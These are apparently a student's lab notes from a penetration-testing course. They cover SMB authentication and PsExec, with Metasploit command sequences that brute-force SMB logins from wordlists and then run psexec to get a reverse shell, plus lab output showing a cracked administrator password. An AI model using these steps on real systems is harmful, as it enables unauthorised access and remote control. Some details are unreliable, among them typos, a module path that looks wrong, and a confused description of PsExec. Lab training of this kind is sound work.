#### SMB
	- Server Message Block, file sharing protocol for LAN
	- Port 445/tcp
	- SAMBA is the linux version of SMB

#### SMB Authentication
	- User Authentication
		Providing username and password
	- Share Authentication
		 Provide a password

Steps of Authentication: 
1. Cleint authentication request
2. Server encrypts String with user's hash
3. Client sends encrypted string
4. The server grants access 

#### PsExec
	- Allows for remote execution
	- Authentication is performed by SMB
	- Similar to RDP, but in GUI.

#### SMB Exploitation with PsExec
	- By brute forcing SMB login
	- Attack the admin account

#### Tools
msfconsole
psexec


#### Commands

Brute force smb login
```
msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
set RHOSTS target_ip
set USER_FILE /usr/share/metasploitframework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
```

Use psexec.py to launch remote commands
```
psexec.py username@target_ip  cmd.exe
```

psecec with msfocnsole, upload payload with reverse shell
```
msfconsole
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS target_ip
set SMBUSER username
set SMBPASS password
set LHOST localhost_ip
exploit
```


## Lab

```
nmap -sS -sV --script smb-protocols.nse 10.4.23.247 

| smb-protocols: 
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

```

```
msfconsole 
use auxiliary/scanner/smb_login
set PASS_FILE
set USER_FILE
set RHOSTS
exploit

[+] 10.4.23.247:445       - 10.4.23.247:445 - Success: '.\administrator:qwertyuiop' Administrator

```


```
search smb type:exploit
use exploit/windows/smb/reverse_tcp
set smbuser Administrator
set smbpass qwertyuiop
set rhosts 10.4.23.46
exploit

cd ..
cat flag.txt
```

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.

**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!


- Dictionaries to use:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
